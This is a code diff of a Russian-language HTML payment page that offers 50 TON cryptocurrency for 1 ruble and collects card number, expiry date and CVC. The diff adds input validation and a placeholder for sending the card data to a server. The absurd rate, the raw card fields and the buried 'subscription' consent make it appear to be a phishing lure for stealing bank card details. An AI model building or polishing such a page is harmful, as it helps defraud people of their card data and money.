@@ -8,6 +8,7 @@
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
         button { background: #0088cc; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 16px; cursor: pointer; }
         .logo { text-align: center; font-size: 24px; margin-bottom: 20px; }
+        .error { color: red; font-size: 12px; display: none; }
     </style>
 </head>
 <body>
@@ -16,10 +17,16 @@
         <h3>Оплата TON</h3>
         <p><strong>1 RUB = 50 TON</strong></p>
         
-        <form>
-            <input type="text" placeholder="Номер карты" required>
-            <input type="text" placeholder="ММ/ГГ" required>
-            <input type="text" placeholder="CVC" required>
+        <form id="paymentForm">
+            <input type="text" id="cardNumber" placeholder="Номер карты (16 цифр)" maxlength="16" required>
+            <div class="error" id="cardError">Неверный номер карты</div>
+            
+            <input type="text" id="expiry" placeholder="ММ/ГГ (4 цифры)" maxlength="5" required>
+            <div class="error" id="expiryError">Неверный формат даты</div>
+            
+            <input type="text" id="cvc" placeholder="CVC (3 цифры)" maxlength="3" required>
+            <div class="error" id="cvcError">Неверный CVC</div>
+            
             <button type="submit">Оплатить 1 RUB</button>
         </form>
         
@@ -27,5 +34,43 @@
             Нажимая кнопку, вы соглашаетесь с условиями подписки
         </p>
     </div>
+
+    <script>
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvc = document.getElementById('cvc').value;
+            
+            // Проверка номера карты (16 цифр)
+            if (!/^\d{16}$/.test(cardNumber)) {
+                document.getElementById('cardError').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('cardError').style.display = 'none';
+            }
+            
+            // Проверка даты (ММ/ГГ)
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                document.getElementById('expiryError').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('expiryError').style.display = 'none';
+            }
+            
+            // Проверка CVC (3 цифры)
+            if (!/^\d{3}$/.test(cvc)) {
+                document.getElementById('cvcError').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('cvcError').style.display = 'none';
+            }
+            
+            // Если все проверки пройдены
+            alert('Платеж обрабатывается...');
+            // Здесь будет отправка данных на сервер
+        });
+    </script>
 </body>
 </html>
